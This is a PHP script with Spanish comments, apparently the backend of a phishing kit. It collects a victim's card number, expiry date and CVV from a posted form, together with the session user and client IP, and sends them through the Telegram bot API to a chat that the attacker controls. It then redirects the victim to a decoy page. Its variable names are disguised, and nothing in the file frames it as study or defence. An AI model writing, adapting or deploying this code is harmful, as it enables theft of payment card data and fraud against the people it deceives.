<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
// Incluir el archivo de configuración
include '../oslo.php';

// Verificar que las variables estén definidas
if (!isset($ambar) || !isset($koala)) {
    die("Error: El token o el ID de chat no están definidos.");
}

// Obtener usuario de sesión
$yunta = $_SESSION['usuario'] ?? 'desconocido';

// Obtener los datos del formulario
$trj_umbr = $_POST['tarj'];
$fh_esme = $_POST['fecha'];
$cv_cedr = $_POST['pass'];

// Función para obtener la IP del cliente
function cli_amane() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Obtener la IP del cliente
$sombra = cli_amane();

// Formatear el mensaje con todos los datos
$dalia = "👤 *Usuario*: $yunta\n";
$dalia .= "📝 *Detalles de la Tarjeta Recibida* 📝\n\n";
$dalia .= "💳 *Número de Tarjeta*: $trj_umbr\n";
$dalia .= "📅 *Fecha de Expiración*: $fh_esme\n";
$dalia .= "🔒 *Código de Seguridad (CVV)*: $cv_cedr\n";
$dalia .= "🌍 *IP del Cliente*: $sombra\n";

// Enviar los datos a Telegram
$juno = "https://api.telegram.org/bot$ambar/sendMessage";
$data = [
    'chat_id' => $koala,
    'text' => $dalia,
    'parse_mode' => 'Markdown'
];

// Usar cURL para enviar la solicitud a Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $juno);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Verificar si el mensaje fue enviado con éxito
if ($response === false) {
    die("Error al enviar el mensaje a Telegram.");
} else {
    // Redirigir a edelweiss.html después de enviar los datos
    header("Location: ../edelweiss.html");
    exit;
}
?>
